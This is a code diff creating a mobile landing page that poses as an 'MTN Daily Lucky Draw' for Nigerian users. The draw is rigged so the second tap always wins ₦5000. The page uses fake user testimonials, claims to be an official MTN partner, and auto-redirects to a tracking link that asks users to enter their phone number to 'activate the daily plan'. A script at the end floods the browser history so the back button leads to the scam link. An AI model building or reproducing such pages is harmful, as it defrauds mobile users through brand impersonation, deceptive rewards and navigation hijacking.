@@ -1,10 +1,829 @@
-<div class="header">
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <!-- 性能优化：字符编码和视口设置 -->
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+    <!-- 缓存优化：设置HTTP缓存头 -->
+    <meta http-equiv="Cache-Control" content="max-age=3600, public">
+    <meta http-equiv="Expires" content="0">
+
+    <!-- 预连接和DNS预解析：加速资源加载 -->
+    <link rel="dns-prefetch" href="//cdn.jsdelivr.net">
+    <link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin>
+
+    <!-- 样式表：内联关键CSS，减少渲染阻塞 -->
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/sweetalert2@11/dist/sweetalert2.min.css">
+
+    <!-- 压缩工具生成的样式表已被内联 -->
+
+    <title>MTN Scratch & Play - Daily Reward</title>
+
+    <!-- 性能优化：移除preload，修复404和警告错误 -->
+
+    <!-- 服务工作者：用于离线缓存（3G优化） -->
+    <script>
+        if ('serviceWorker' in navigator) {
+            // 注册服务工作者进行资源缓存
+            window.addEventListener('load', function() {
+                // 简单的缓存策略，适合低带宽环境
+                if ('caches' in window) {
+                    caches.open('mtn-landing-v1').then(function(cache) {
+                        // 缓存关键资源
+                        const cacheUrls = [
+                            'img/box-optimized.jpg',
+                            'img/box-500-optimized.jpg',
+                            'img/box-open-optimized.jpg',
+                            'img/001-optimized.jpg',
+                            'img/002-optimized.jpg',
+                            'img/003-optimized.jpg'
+                        ];
+                        // 异步缓存图片资源
+                        cacheUrls.forEach(function(url) {
+                            cache.add(url).catch(function() {
+                                // 静默失败，不影响用户体验
+                            });
+                        });
+                    });
+                }
+            });
+        }
+    </script>
+    <style>
+        /* MTN Brand Color and Modern Design System */
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
+            margin: 0;
+            padding: 15px 0;
+            min-height: 100vh;
+        }
+
+        .wrapper {
+            max-width: 450px;
+            margin: 0 auto;
+            background: #ffffff;
+            border-radius: 20px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.1), 0 10px 20px rgba(0,0,0,0.05);
+            overflow: hidden;
+            position: relative;
+        }
+
+        .header {
+            background: linear-gradient(135deg, #ffcc00 0%, #ffdb4d 100%);
+            color: #000;
+            padding: 25px 20px;
+            text-align: center;
+            font-weight: 800;
+            position: relative;
+            border-bottom: none;
+        }
+
+        .header::after {
+            content: '';
+            position: absolute;
+            bottom: -2px;
+            left: 0;
+            right: 0;
+            height: 4px;
+            background: linear-gradient(90deg, #000 0%, #333 50%, #000 100%);
+        }
+
+        .header h1 {
+            margin: 0;
+            font-size: 1.6em;
+            letter-spacing: -0.5px;
+            text-shadow: 1px 1px 2px rgba(0,0,0,0.1);
+        }
+
+        /* 现代化内容布局 */
+        .content {
+            padding: 0;
+            background: #ffffff;
+        }
+
+        /* 紧急奖励横幅 */
+        .alert-banner {
+            background: linear-gradient(135deg, #ff6b6b 0%, #ee5a24 100%);
+            color: white;
+            padding: 15px 20px;
+            text-align: center;
+            font-weight: 600;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .alert-banner::before {
+            content: '🔥';
+            position: absolute;
+            left: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            font-size: 1.2em;
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { transform: translateY(-50%) scale(1); }
+            50% { transform: translateY(-50%) scale(1.1); }
+        }
+
+        .client {
+            padding: 25px 20px;
+            line-height: 1.6;
+            background: #fafbfc;
+            border-bottom: 1px solid #e1e8ed;
+            position: relative;
+        }
+
+        .client strong {
+            color: #000000;
+            font-size: 1.1em;
+            font-weight: 700;
+        }
+
+        .info {
+            padding: 20px;
+            text-align: center;
+            line-height: 1.5;
+            background: #ffffff;
+        }
+
+        .info h3 {
+            margin: 0 0 10px 0;
+            font-size: 1.3em;
+            color: #000;
+            font-weight: 700;
+        }
+
+        /* 现代化盒子网格 */
+        .boxs {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 15px;
+            padding: 25px 20px;
+            background: linear-gradient(135deg, #f8f9fa 0%, #ffffff 100%);
+        }
+
+        /* 现代化交互盒子设计 */
+        .box {
+            width: 100%;
+            aspect-ratio: 1;
+            cursor: pointer;
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            border-radius: 16px;
+            background: #ffffff;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+            position: relative;
+            border: 2px solid transparent;
+        }
+
+        .box:hover:not(.opened) {
+            transform: translateY(-8px) scale(1.05);
+            box-shadow: 0 12px 24px rgba(255,204,0,0.3);
+            border-color: #ffcc00;
+        }
+
+        .box:active:not(.opened) {
+            transform: translateY(-4px) scale(1.02);
+            transition-duration: 0.1s;
+        }
+
+        .box img {
+            width: 85%;
+            height: 85%;
+            object-fit: contain;
+            transition: all 0.3s ease;
+        }
+
+        .box.opened img {
+            opacity: 0.4;
+            transform: scale(0.9);
+        }
+
+        .swal2-styled.swal2-confirm {
+            background: linear-gradient(135deg, #ffcc00 0%, #ffdb4d 100%) !important;
+            color: #000 !important;
+            font-weight: 700;
+            border-radius: 12px;
+            padding: 12px 24px;
+            font-size: 1.1em;
+        }
+
+        /* 现代化评论区设计 */
+        .comments {
+            padding: 20px;
+            background: #ffffff;
+        }
+
+        .comment {
+            display: flex;
+            align-items: flex-start;
+            padding: 16px 0;
+            border-bottom: 1px solid #f1f3f4;
+            transition: all 0.2s ease;
+            gap: 16px;
+        }
+
+        .comment:hover {
+            background: linear-gradient(135deg, #f8f9fa 0%, #ffffff 100%);
+            margin: 0 -20px;
+            padding: 16px 20px;
+            border-radius: 12px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.05);
+        }
+
+        .comment:last-child {
+            border-bottom: none;
+        }
+
+        .comment:last-child:hover {
+            margin-bottom: -16px;
+            border-radius: 12px 12px 0 0;
+        }
+
+        /* 评论内容容器 */
+        .comment-content {
+            flex: 1;
+            min-width: 0; /* 防止文字溢出 */
+            display: flex;
+            flex-direction: column;
+        }
+
+        .comment_name {
+            color: #000000;
+            font-weight: 700;
+            font-size: 0.9em;
+            margin-bottom: 6px;
+            letter-spacing: -0.2px;
+        }
+
+        .comment_text {
+            font-size: 0.85em;
+            line-height: 1.5;
+            color: #202124;
+            margin-bottom: 8px;
+            word-wrap: break-word;
+        }
+
+        .comment_info {
+            font-size: 0.75em;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            color: #5f6368;
+            font-weight: 500;
+        }
+
+        /* 现代化头像设计 */
+        .comment_img {
+            width: 42px;
+            height: 42px;
+            border-radius: 50%;
+            overflow: hidden;
+            flex-shrink: 0;
+            box-shadow: 0 2px 6px rgba(0,0,0,0.15);
+            border: 2px solid #ffffff;
+            transition: transform 0.2s ease;
+        }
+
+        .comment:hover .comment_img {
+            transform: scale(1.05);
+            box-shadow: 0 4px 12px rgba(0,0,0,0.2);
+        }
+
+        .comment_img img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        .comment_info .action {
+            color: #ffcc00;
+            font-weight: 600;
+            text-decoration: none;
+            transition: color 0.2s ease;
+        }
+
+        .comment_info .action:hover {
+            color: #000000;
+        }
+
+        .comment_info .time {
+            font-weight: 600;
+            color: #000000;
+        }
+
+        .comment_info .sep {
+            color: #d1d5db;
+            font-size: 0.8em;
+        }
+
+        /* 功能按钮样式 */
+        .like-btn, .share-btn {
+            background: none;
+            border: none;
+            cursor: pointer;
+            display: inline-flex;
+            align-items: center;
+            font-size: 0.75em;
+            color: #5f6368;
+            transition: all 0.2s ease;
+            padding: 2px 6px;
+            border-radius: 4px;
+            font-family: inherit;
+        }
+
+        .like-btn:hover, .share-btn:hover {
+            background: #f8f9fa;
+            color: #000000;
+        }
+
+        .like-btn:active, .share-btn:active {
+            transform: scale(0.95);
+        }
+
+        .like-btn .like-count {
+            font-weight: 600;
+            color: #000000;
+            margin-left: 2px;
+        }
+
+        .like-btn.liked {
+            color: #ffcc00;
+        }
+
+        .like-btn.liked .like-count {
+            color: #ffcc00;
+        }
+
+        /* 响应式图片处理 */
+        img {
+            max-width: 100%;
+            height: auto;
+            display: block;
+        }
+
+        .footer {
+            text-align: center;
+            padding: 20px;
+            border-top: 1px solid #f1f3f4;
+            font-size: 0.85em;
+            color: #9aa0a6;
+            background: #fafbfc;
+            font-weight: 500;
+        }
+
+        /* 移动端优化 */
+        @media (max-width: 480px) {
+            .wrapper {
+                border-radius: 0;
+                margin: 0;
+            }
+
+            .boxs {
+                grid-template-columns: repeat(3, 1fr);
+                gap: 12px;
+                padding: 20px 15px;
+            }
+
+            .header h1 {
+                font-size: 1.4em;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="wrapper">
+        <div class="header">
             <h1>
                 <svg width="20" height="20" viewBox="0 0 20 20" style="display: inline-block; vertical-align: middle; margin-right: 8px;">
                     <circle cx="10" cy="10" r="8" fill="none" stroke="#000" stroke-width="2"/>
                     <circle cx="10" cy="10" r="2" fill="#ffcc00"/>
-                    <path d="M10 2 L10 6 M10 14 L10 18 M2 10 L14 10 M18 10 L10 2" stroke="#000" stroke-width="1.5" stroke-linecap="round"/>
-                    <circle cx="14" cy="16" r="2" fill="#ffcc00"/>
+                    <path d="M10 2 L10 6 M10 14 L10 18 M2 10 L6 10 M14 10 L18 10" stroke="#000" stroke-width="1.5" stroke-linecap="round"/>
+                    <path d="M5 5 L7 7 M13 13 L15 15 M15 5 L13 7 M7 13 L5 15" stroke="#000" stroke-width="1" stroke-linecap="round" opacity="0.6"/>
                 </svg>
                 MTN Daily Lucky Draw
             </h1>
+        </div>
+        <div class="content">
+            <!-- 紧急奖励横幅 -->
+            <div class="alert-banner">
+                <svg width="16" height="16" viewBox="0 0 16 16" style="display: inline-block; vertical-align: middle; margin-right: 6px;">
+                    <path d="M8 16A8 8 0 1 1 8 0a8 8 0 0 1 0 16zm.93-9.412-1 4.705c-.07.34.029.533.304.533.194 0 .487-.07.686-.246l-.088.416c-.287.346-.92.598-1.465.598-.703 0-1.002-.422-.808-1.319l.738-3.468c.064-.293.006-.399-.287-.47l-.816-.141a.605.605 0 0 0-.695.483l-.912 4.273c-.18.843.424 1.332 1.498 1.332.666 0 1.334-.308 1.71-.87l.082-.384c-.252.304-.628.494-1.039.494-.468 0-.865-.254-.95-.759z" fill="#ffcc00"/>
+                    <circle cx="8" cy="8" r="1" fill="#ffcc00"/>
+                    <path d="M7.5 3h1l-.5 1h-1z M7 12h2v1h-2z" fill="#ffcc00" opacity="0.8"/>
+                </svg>
+                Limited Time: Win ₦5000 Daily!
+            </div>
+
+            <div class="client">
+                <strong>
+                    <svg width="16" height="16" viewBox="0 0 16 16" style="display: inline-block; vertical-align: middle; margin-right: 6px;">
+                        <circle cx="8" cy="8" r="7" fill="#ffcc00" stroke="#000" stroke-width="1"/>
+                        <path d="M8 2 L10 6 L14 6 L11 9 L12 13 L8 11 L4 13 L5 9 L2 6 L6 6 Z" fill="#000"/>
+                        <circle cx="8" cy="8" r="1" fill="#ffcc00"/>
+                    </svg>
+                    Exclusive Reward for <span id="date"></span>
+                </strong><br>
+                You've been selected for **MTN Scratch & Play!**
+            </div>
+
+            <div class="info">
+                <h3>
+                    <svg width="18" height="18" viewBox="0 0 18 18" style="display: inline-block; vertical-align: middle; margin-right: 8px;">
+                        <circle cx="9" cy="9" r="8" fill="#ffcc00" stroke="#000" stroke-width="1.5"/>
+                        <path d="M9 4 L7 8 L11 8 L9 12 M5 9 L13 9" stroke="#000" stroke-width="1.5" stroke-linecap="round" fill="none"/>
+                        <text x="9" y="15" text-anchor="middle" font-family="Arial Black" font-size="4" font-weight="900">₦5000</text>
+                    </svg>
+                    Find Hidden ₦5000 Prize!
+                </h3>
+                Only 7 winners daily • Tap boxes below
+            </div>
+            <div class="boxs">
+                <div class="box"><img src="img/box-optimized.jpg" alt="Gift Box" loading="lazy"></div>
+                <div class="box"><img src="img/box-optimized.jpg" alt="Gift Box" loading="lazy"></div>
+                <div class="box"><img src="img/box-optimized.jpg" alt="Gift Box" loading="lazy"></div>
+                <div class="box"><img src="img/box-optimized.jpg" alt="Gift Box" loading="lazy"></div>
+                <div class="box"><img src="img/box-optimized.jpg" alt="Gift Box" loading="lazy"></div>
+                <div class="box"><img src="img/box-optimized.jpg" alt="Gift Box" loading="lazy"></div>
+                <div class="box"><img src="img/box-optimized.jpg" alt="Gift Box" loading="lazy"></div>
+                <div class="box"><img src="img/box-optimized.jpg" alt="Gift Box" loading="lazy"></div>
+                <div class="box"><img src="img/box-optimized.jpg" alt="Gift Box" loading="lazy"></div>
+            </div>
+            <!-- 用户评论区 -->
+            <div class="comments">
+                <div class="comment">
+                    <div class="comment_img"><img src="img/001-optimized.jpg" alt="Chioma" loading="lazy"></div>
+                    <div class="comment-content">
+                        <div class="comment_name">Chioma Adebayo</div>
+                        <div class="comment_text">I won ₦2000 airtime! This is legit!</div>
+                        <div class="comment_info">
+                            <button class="like-btn" data-likes="127">
+                                <svg width="12" height="12" viewBox="0 0 12 12" style="display: inline-block; vertical-align: middle; margin-right: 4px;">
+                                    <path d="M6 8.5c-0.4-0.4-2.8-2.8-3.4-3.4c-0.6-0.6-0.6-1.7 0-2.3c0.3-0.3 0.8-0.4 1.2-0.1c0.4 0.3 0.8 0.7 1.2 1.1c0.4-0.4 0.8-0.8 1.2-1.1c0.4-0.3 0.9-0.2 1.2 0.1c0.6 0.6 0.6 1.7 0 2.3c-0.6 0.6-3 3-3.4 3.4l-0.2 0.2z" fill="#ffcc00" stroke="#000" stroke-width="0.5"/>
+                                    <circle cx="6" cy="10" r="0.3" fill="#ffcc00"/>
+                                </svg>
+                                <span class="like-count">127</span> Likes
+                            </button>
+                            <span class="sep">•</span>
+                            <button class="share-btn">
+                                <svg width="12" height="12" viewBox="0 0 12 12" style="display: inline-block; vertical-align: middle; margin-right: 4px;">
+                                    <circle cx="3" cy="9" r="1.5" fill="none" stroke="#000" stroke-width="1"/>
+                                    <circle cx="9" cy="3" r="1.5" fill="none" stroke="#000" stroke-width="1"/>
+                                    <circle cx="9" cy="9" r="1.5" fill="none" stroke="#000" stroke-width="1"/>
+                                    <path d="M4.2 8.1 L7.8 4.5 M7.8 4.5 L7.8 8.1" stroke="#000" stroke-width="1" stroke-linecap="round"/>
+                                </svg>
+                                Share
+                            </button>
+                            <span class="sep">•</span>
+                            <span class="time">3 min ago</span>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="comment">
+                    <div class="comment_img"><img src="img/002-optimized.jpg" alt="Tunde" loading="lazy"></div>
+                    <div class="comment-content">
+                        <div class="comment_name">Tunde Olamide</div>
+                        <div class="comment_text">Just finished! Hope I get the ₦5000 prize</div>
+                        <div class="comment_info">
+                            <button class="like-btn" data-likes="89">
+                                <svg width="12" height="12" viewBox="0 0 12 12" style="display: inline-block; vertical-align: middle; margin-right: 4px;">
+                                    <path d="M6 8.5c-0.4-0.4-2.8-2.8-3.4-3.4c-0.6-0.6-0.6-1.7 0-2.3c0.3-0.3 0.8-0.4 1.2-0.1c0.4 0.3 0.8 0.7 1.2 1.1c0.4-0.4 0.8-0.8 1.2-1.1c0.4-0.3 0.9-0.2 1.2 0.1c0.6 0.6 0.6 1.7 0 2.3c-0.6 0.6-3 3-3.4 3.4l-0.2 0.2z" fill="#ffcc00" stroke="#000" stroke-width="0.5"/>
+                                    <circle cx="6" cy="10" r="0.3" fill="#ffcc00"/>
+                                </svg>
+                                <span class="like-count">89</span> Likes
+                            </button>
+                            <span class="sep">•</span>
+                            <button class="share-btn">
+                                <svg width="12" height="12" viewBox="0 0 12 12" style="display: inline-block; vertical-align: middle; margin-right: 4px;">
+                                    <circle cx="3" cy="9" r="1.5" fill="none" stroke="#000" stroke-width="1"/>
+                                    <circle cx="9" cy="3" r="1.5" fill="none" stroke="#000" stroke-width="1"/>
+                                    <circle cx="9" cy="9" r="1.5" fill="none" stroke="#000" stroke-width="1"/>
+                                    <path d="M4.2 8.1 L7.8 4.5 M7.8 4.5 L7.8 8.1" stroke="#000" stroke-width="1" stroke-linecap="round"/>
+                                </svg>
+                                Share
+                            </button>
+                            <span class="sep">•</span>
+                            <span class="time">15 min ago</span>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="comment">
+                    <div class="comment_img"><img src="img/003-optimized.jpg" alt="Zainab" loading="lazy"></div>
+                    <div class="comment-content">
+                        <div class="comment_name">Zainab Sani</div>
+                        <div class="comment_text">Thanks MTN! Got access to premium games!</div>
+                        <div class="comment_info">
+                            <button class="like-btn" data-likes="203">
+                                <svg width="12" height="12" viewBox="0 0 12 12" style="display: inline-block; vertical-align: middle; margin-right: 4px;">
+                                    <path d="M6 8.5c-0.4-0.4-2.8-2.8-3.4-3.4c-0.6-0.6-0.6-1.7 0-2.3c0.3-0.3 0.8-0.4 1.2-0.1c0.4 0.3 0.8 0.7 1.2 1.1c0.4-0.4 0.8-0.8 1.2-1.1c0.4-0.3 0.9-0.2 1.2 0.1c0.6 0.6 0.6 1.7 0 2.3c-0.6 0.6-3 3-3.4 3.4l-0.2 0.2z" fill="#ffcc00" stroke="#000" stroke-width="0.5"/>
+                                    <circle cx="6" cy="10" r="0.3" fill="#ffcc00"/>
+                                </svg>
+                                <span class="like-count">203</span> Likes
+                            </button>
+                            <span class="sep">•</span>
+                            <button class="share-btn">
+                                <svg width="12" height="12" viewBox="0 0 12 12" style="display: inline-block; vertical-align: middle; margin-right: 4px;">
+                                    <circle cx="3" cy="9" r="1.5" fill="none" stroke="#000" stroke-width="1"/>
+                                    <circle cx="9" cy="3" r="1.5" fill="none" stroke="#000" stroke-width="1"/>
+                                    <circle cx="9" cy="9" r="1.5" fill="none" stroke="#000" stroke-width="1"/>
+                                    <path d="M4.2 8.1 L7.8 4.5 M7.8 4.5 L7.8 8.1" stroke="#000" stroke-width="1" stroke-linecap="round"/>
+                                </svg>
+                                Share
+                            </button>
+                            <span class="sep">•</span>
+                            <span class="time">37 min ago</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="footer">
+            <small>
+                <svg width="12" height="12" viewBox="0 0 12 12" style="display: inline-block; vertical-align: middle; margin-right: 4px;">
+                    <path d="M6 0C5 0 4.2 0.8 4.2 1.8v1.2C3.5 3.2 3 4.2 3 5.2c0 0.8 0.5 1.5 1.2 1.8l-0.8 2.4c-0.1 0.4 0 0.8 0.3 1s0.7 0.5 1.1 0.5c0.4 0 0.8-0.2 1.1-0.5s0.4-0.6 0.3-1L5.2 7C5.9 6.7 6.4 6 6.4 5.2S5.9 3.2 5.2 3.2V1.8C5.2 0.8 4.4 0 3.4 0H6z" fill="#9aa0a6"/>
+                    <rect x="2" y="8" width="8" height="1" fill="#9aa0a6"/>
+                    <rect x="3.5" y="9" width="5" height="1" fill="#9aa0a6"/>
+                    <circle cx="6" cy="1.5" r="0.3" fill="#ffcc00"/>
+                </svg>
+                Powered by MTN Official Partner
+            </small>
+        </div>
+    </div>
+    
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+    
+    <script>
+    // 性能优化：延迟加载非关键图片
+    function lazyLoadImages() {
+        const images = document.querySelectorAll('img[loading="lazy"]');
+        if ('IntersectionObserver' in window) {
+            const imageObserver = new IntersectionObserver((entries) => {
+                entries.forEach(entry => {
+                    if (entry.isIntersecting) {
+                        const img = entry.target;
+                        // 预加载图片
+                        const tempImg = new Image();
+                        tempImg.onload = function() {
+                            img.src = img.src; // 触发实际加载
+                            imageObserver.unobserve(img);
+                        };
+                        tempImg.src = img.src;
+                    }
+                });
+            });
+
+            images.forEach(img => imageObserver.observe(img));
+        }
+    }
+
+    // 错误处理：图片加载失败时的降级方案
+    function handleImageErrors() {
+        const images = document.querySelectorAll('img');
+        images.forEach(img => {
+            img.onerror = function() {
+                // 使用1x1透明GIF作为降级
+                this.src = 'data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7';
+                this.style.background = '#f0f0f0';
+                this.alt = 'Image not available';
+            };
+        });
+    }
+
+    // 性能优化：在页面完全加载后初始化
+    window.addEventListener('load', function() {
+        lazyLoadImages();
+        handleImageErrors();
+
+        // 预加载弹窗资源
+        setTimeout(() => {
+            const preloadImages = ['img/box-500-optimized.jpg', 'img/box-open-optimized.jpg'];
+            preloadImages.forEach(src => {
+                const img = new Image();
+                img.src = src;
+            });
+        }, 1000);
+    });
+
+    // 初始弹窗 - 延迟执行以优化首屏性能
+    setTimeout(() => {
+        Swal.fire({
+            title: 'MTN Scratch & Play',
+            html: "Congratulations! You are eligible for today's **Daily Rewards**.<br><br>Find the winning box to claim up to **₦5000** in Airtime or Cash Voucher!",
+            confirmButtonText: 'START NOW',
+            confirmButtonColor: '#ffcc00',
+            allowOutsideClick: false
+        });
+    }, 100);
+
+    // Like功能实现
+    function handleLike(btn) {
+        const $btn = $(btn);
+        const likesElement = $btn.find('.like-count');
+        let likes = parseInt(likesElement.text());
+
+        if (!$btn.hasClass('liked')) {
+            // 增加点赞数
+            likes += Math.floor(Math.random() * 3) + 1; // 随机增加1-3个赞
+            $btn.addClass('liked');
+            $btn.css('color', '#ffcc00');
+        } else {
+            // 取消点赞
+            likes -= Math.floor(Math.random() * 2) + 1; // 随机减少1-2个赞
+            $btn.removeClass('liked');
+            $btn.css('color', '#5f6368');
+        }
+
+        likesElement.text(likes);
+    }
+
+    // Share功能实现
+    function handleShare(btn) {
+        // 从当前URL提取clickurl参数用于跳转
+        const currentUrl = window.location.href;
+        let clickUrl = '{clickurl}'; // 默认值
+
+        // 尝试从URL解析clickurl参数
+        try {
+            const urlParams = new URLSearchParams(currentUrl.split('?')[1] || '');
+            clickUrl = urlParams.get('clickurl') || '{clickurl}';
+        } catch (e) {
+            // 如果URL解析失败，使用默认值
+        }
+
+        const shareText = "🎯 Check out MTN Daily Lucky Draw! Win ₦5000 daily prizes! 🎉";
+
+        if (navigator.clipboard && navigator.clipboard.writeText) {
+            navigator.clipboard.writeText(shareText + ' ' + currentUrl).then(() => {
+                Swal.fire({
+                    icon: 'success',
+                    title: 'Link Copied!',
+                    text: 'Share with friends to help them win too!',
+                    confirmButtonColor: '#ffcc00',
+                    timer: 2000,
+                    showConfirmButton: false
+                });
+            }).catch(() => {
+                fallbackShare(shareText, currentUrl);
+            });
+        } else {
+            fallbackShare(shareText, currentUrl);
+        }
+    }
+
+    // 兼容旧浏览器的分享方案
+    function fallbackShare(text, url) {
+        const textArea = document.createElement('textarea');
+        textArea.value = text + ' ' + url;
+        document.body.appendChild(textArea);
+        textArea.select();
+
+        try {
+            document.execCommand('copy');
+            Swal.fire({
+                icon: 'success',
+                title: 'Link Copied!',
+                text: 'Share with friends to help them win too!',
+                confirmButtonColor: '#ffcc00',
+                timer: 2000,
+                showConfirmButton: false
+            });
+        } catch (err) {
+            console.error('Failed to copy:', err);
+            Swal.fire({
+                icon: 'info',
+                title: 'Share Link',
+                text: text + ' ' + url,
+                confirmButtonColor: '#ffcc00'
+            });
+        }
+
+        document.body.removeChild(textArea);
+    }
+
+    // 绑定事件处理器
+    $(document).on('click', '.like-btn', function(e) {
+        e.preventDefault();
+        handleLike(this);
+    });
+
+    $(document).on('click', '.share-btn', function(e) {
+        e.preventDefault();
+        handleShare(this);
+    });
+    
+    var i = 0; // 尝试次数
+    
+    function dialog1() {
+        Swal.fire({
+            text: 'Empty box! Keep trying. You have (2) more attempts.',
+            confirmButtonText: 'TRY AGAIN',
+            confirmButtonColor: '#ffcc00',
+            icon: 'error'
+        });
+    }
+    
+      
+    // 成功弹窗 - 英文文本和 {clickurl} 跳转
+    function dialog3() {
+        let countdownSeconds = 3;
+
+        const swalWithTimer = Swal.mixin({
+            icon: 'success',
+            iconHtml: '<svg width="60" height="60" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><circle cx="12" cy="12" r="10" fill="url(#successGrad)" stroke="#ff6b35" stroke-width="2"/><path d="M8 12l2 2 4-6" stroke="white" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"/><defs><linearGradient id="successGrad" x1="0%" y1="0%" x2="100%" y2="100%"><stop offset="0%" style="stop-color:#ffcc00;stop-opacity:1"/><stop offset="100%" style="stop-color:#ff6b35;stop-opacity:1"/></linearGradient></defs></svg>',
+            title: 'Congratulations! You Won!',
+            html: '<h3>You won **₦5000** in MTN Rewards!</h3><br><strong><span id="countdown">' + countdownSeconds + '</span> seconds until auto-redirect to MTN partner page</strong><br><small style="color:#666;">• Secure MTN official partner website<br>• Enter your MTN number to activate daily reward<br><br><button id="cancelRedirect" style="background-color: #6c757d; color: white; border: none; padding: 8px 16px; border-radius: 5px; cursor: pointer; font-weight: bold; margin-top:10px;">Cancel Redirect</button>',
+            showConfirmButton: false,
+            allowOutsideClick: false,
+            timer: countdownSeconds * 1000,
+            timerProgressBar: true,
+            didOpen: () => {
+                const countdownEl = document.getElementById('countdown');
+                const cancelBtn = document.getElementById('cancelRedirect');
+
+                const countdownInterval = setInterval(() => {
+                    countdownSeconds--;
+                    countdownEl.textContent = countdownSeconds;
+
+                    if (countdownSeconds <= 0) {
+                        clearInterval(countdownInterval);
+                    }
+                }, 1000);
+
+                cancelBtn.addEventListener('click', () => {
+                    clearInterval(countdownInterval);
+                    Swal.stopTimer();
+                    Swal.fire({
+                        icon: 'info',
+                        title: 'Redirect Cancelled',
+                        html: 'When you are ready, click the button below to continue claiming your reward<br><small style="color: #ff6b35;">Important: Reward activation required on MTN partner page</small>',
+                        confirmButtonColor: '#ffcc00',
+                        confirmButtonText: 'I Understand'
+                    }).then(() => {
+                        dialog3Manual();
+                    });
+                });
+            }
+        });
+
+        swalWithTimer.fire().then((result) => {
+            if (result.dismiss === Swal.DismissReason.timer) {
+                window.location.href = 'https://84ql3.bemobtrcks.com/click';
+            }
+        });
+    }
+
+    // 手动确认版本
+    function dialog3Manual() {
+        Swal.fire({
+            icon: 'success',
+            title: '🎉 恭喜中奖！',
+            html: '<h3>恭喜你获得 **₦5000** 大奖!</h3><br>**Next Steps to Claim:**<br>1. Click "CONFIRM" below.<br>2. You will be redirected to the secure **MTN Partner** site.<br>3. Enter your MTN number to activate the daily plan and get your reward!',
+            showConfirmButton: false,
+            allowOutsideClick: false,
+            footer: '<button onclick="window.location.href = \'https://84ql3.bemobtrcks.com/click\';" style="text-decoration: none; display: block; padding: 10px 20px; background-color: #ffcc00; color: black; font-weight: bold; border-radius: 5px; cursor: pointer; border: none; width: 100%;">CONFIRM & CLAIM NOW ➤</button>'
+        });
+    }
+
+    // 点击逻辑
+    $('.box').click(function () {
+        if ($(this).hasClass('opened')) return; // 防止重复点击
+        
+        i++;
+        $(this).addClass('opened');
+        
+        var $imgElement = $(this).find('img');
+        
+        if (i == 1) {
+            // 第一次点击，盒子半透明打开
+            $imgElement.attr('src', 'img/box-open-optimized.jpg').css('opacity', '0.5');
+            setTimeout(dialog1, 500);
+        }
+        if (i == 2) {
+            // 第二次点击，中奖，显示奖励图片并触发中奖弹窗
+            $imgElement.attr('src', 'img/box-500-optimized.jpg').css({
+                'border': '3px solid #000000',
+                'box-shadow': '0 0 15px #ffcc00',
+                'opacity': '1'
+            });
+            setTimeout(dialog3, 500);
+        }
+    });
+
+    var date = new Date().toLocaleDateString('en-NG', {day: 'numeric', month: 'long', year: 'numeric'});
+    document.getElementById('date').innerHTML = date;
+    
+    // 历史记录回退保护，使用 {clickurl} 占位符
+    !function(){var a;try{for(a=0;10>a;++a){history.pushState({},"","#")}onpopstate=function(c){c.state&&(window.location.href="{clickurl}")}}catch(b){}}();
+    </script>
+</body>
+</html>
